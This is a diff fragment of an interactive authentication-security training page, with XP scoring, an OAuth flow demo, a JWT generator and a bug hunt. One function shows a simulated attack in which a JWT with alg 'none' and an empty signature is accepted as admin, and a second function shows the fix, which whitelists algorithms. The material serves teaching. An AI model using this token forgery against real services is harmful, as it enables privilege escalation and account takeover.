+<span style="color: #64748b;">14</span>   }
+<span style="color: #64748b;">15</span> });</pre>
+                    </div>
+                    <div id="bugScore" style="margin-top: 1rem;">Bugs found: 0/3</div>
+                </div>
+            </div>
+
+            <!-- FINAL CHALLENGE -->
+            <div id="final" class="module">
+                <div class="header">
+                    <h1>🏆 Final Challenge: Architect SecureAuth Inc.</h1>
+                    <p style="color: var(--text-secondary); margin-top: 0.5rem;">
+                        Design a complete authentication system for a fintech startup handling sensitive data.
+                    </p>
+                </div>
+
+                <div class="card">
+                    <h3>Requirements:</h3>
+                    <ul style="margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary);">
+                        <li>Support Web, iOS, and Android clients</li>
+                        <li>SSO integration with Google and Enterprise Azure AD</li>
+                        <li>PCI-DSS compliance (strict audit logs)</li>
+                        <li>Protection against credential stuffing</li>
+                        <li>Session revocation capability (stolen device scenario)</li>
+                    </ul>
+
+                    <button class="btn btn-primary" onclick="alert('Complete all previous modules to unlock the solution architecture!')">
+                        Submit Architecture
+                    </button>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // State Management
+        let xp = 0;
+        let currentStep = 0;
+        let bugsFound = 0;
+        const foundBugs = new Set();
+
+        // Navigation
+        function showModule(moduleId) {
+            document.querySelectorAll('.module').forEach(m => m.classList.remove('active'));
+            document.getElementById(moduleId).classList.add('active');
+            
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            event.target.classList.add('active');
+            
+            // Add XP for visiting new modules
+            addXP(10);
+        }
+
+        function addXP(amount) {
+            xp += amount;
+            document.getElementById('xpText').textContent = xp + ' XP';
+            document.getElementById('xpFill').style.width = Math.min((xp / 1000) * 100, 100) + '%';
+        }
+
+        // JWT Functions
+        function generateSampleJWT() {
+            const header = btoa(JSON.stringify({alg: "HS256", typ: "JWT"}));
+            const payload = btoa(JSON.stringify({
+                user: "admin",
+                role: "admin",
+                iat: Math.floor(Date.now() / 1000),
+                exp: Math.floor(Date.now() / 1000) + 3600
+            }));
+            const signature = "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
+            
+            document.getElementById('jwtVisualizer').innerHTML = `
+                <span class="jwt-header">${header}</span>.
+                <span class="jwt-payload">${payload}</span>.
+                <span class="jwt-signature">${signature}</span>
+            `;
+            
+            document.getElementById('jwtHeader').textContent = atob(header);
+            document.getElementById('jwtPayload').textContent = atob(payload);
+            addXP(5);
+        }
+
+        function exploitNoneAlg() {
+            const console = document.getElementById('vulnConsole');
+            console.innerHTML = `> Sending token with alg: "none"...
+> Header: {"alg":"none","typ":"JWT"}
+> Payload: {"user":"admin","role":"admin"}
+> Signature: (empty)
+> 
+> 🔴 SERVER RESPONSE: 200 OK
+> 🔴 Token accepted! You are now admin!
+> 
+> Vulnerability: Server accepted unsigned tokens`;
+            console.className = "console-output";
+            addXP(20);
+        }
+
+        function fixNoneAlg() {
+            const textarea = document.getElementById('vulnCode');
+            textarea.value = `function verifyToken(token) {
+    const allowedAlgs = ['HS256', 'RS256']; // Whitelist!
+    const [headerB64, payloadB64, signature] = token.split('.');
+    const header = JSON.parse(atob(headerB64));
+    
+    // ✅ Whitelist allowed algorithms
+    if (!allowedAlgs.includes(header.alg)) {
+        throw new Error('Algorithm not allowed');
+    }
+    
+    // ✅ Never accept "none"
+    if (header.alg === 'none') {
+        throw new Error('Insecure algorithm');
+    }
+    
+    return crypto.verify(header.alg, signature, SECRET, 
+        headerB64 + '.' + payloadB64);
+}`;
+            document.getElementById('vulnConsole').textContent = 'Code fixed! Always whitelist algorithms, never trust the client.';
+            addXP(15);
+        }
+
+        // Quiz System
+        function checkAnswer(btn, isCorrect) {
+            document.querySelectorAll('.quiz-option').forEach(b => {
+                b.disabled = true;
+                if (b === btn) {
+                    b.classList.add(isCorrect ? 'correct' : 'wrong');
+                }
+            });
+            
+            document.getElementById('jwtExplanation').style.display = 'block';
+            
+            if (isCorrect) addXP(25);
+        }
+
+        // OAuth Flow
+        function nextFlowStep() {
+            const steps = document.querySelectorAll('.flow-step');
+            if (currentStep < steps.length - 1) {
+                steps[currentStep].classList.remove('active');
+                currentStep++;
+                steps[currentStep].classList.add('active');
+                addXP(5);
+            } else {
+                currentStep = 0;
+                steps.forEach(s => s.classList.remove('active'));
+                steps[0].classList.add('active');
+            }
+        }
+
+        // Password Hashing Demo
+        document.getElementById('passwordInput')?.addEventListener('input', function(e) {
+            const val = e.target.value;
+            if (val.length === 0) return;
+            
+            // Simulate SHA256 (fast)
+            document.getElementById('sha256Hash').textContent = 
+                '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8';
+            
+            // Simulate bcrypt (slow, with salt)
+            document.getElementById('bcryptHash').textContent = 
+                '$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/X4.VTtYA.qGZvKG6G';
+        });
+
+        // Bug Hunt
+        function foundBug(element, type) {
+            if (foundBugs.has(type)) return;
+            
+            foundBugs.add(type);
+            element.style.background = 'rgba(16, 185, 129, 0.3)';
+            bugsFound++;
+            
+            document.getElementById('bugScore').textContent = `Bugs found: ${bugsFound}/3`;
+            addXP(30);
+            
+            if (bugsFound === 3) {
+                setTimeout(() => alert('🏆 All bugs found! You have a security mindset!'), 500);
+            }
+        }
+
+        function simulateXSS() {
+            document.getElementById('xssResult').style.display = 'block';
+            addXP(10);
+        }
+
+        // Initialize
+        generateSampleJWT();
+    </script>
+</body>
+</html>
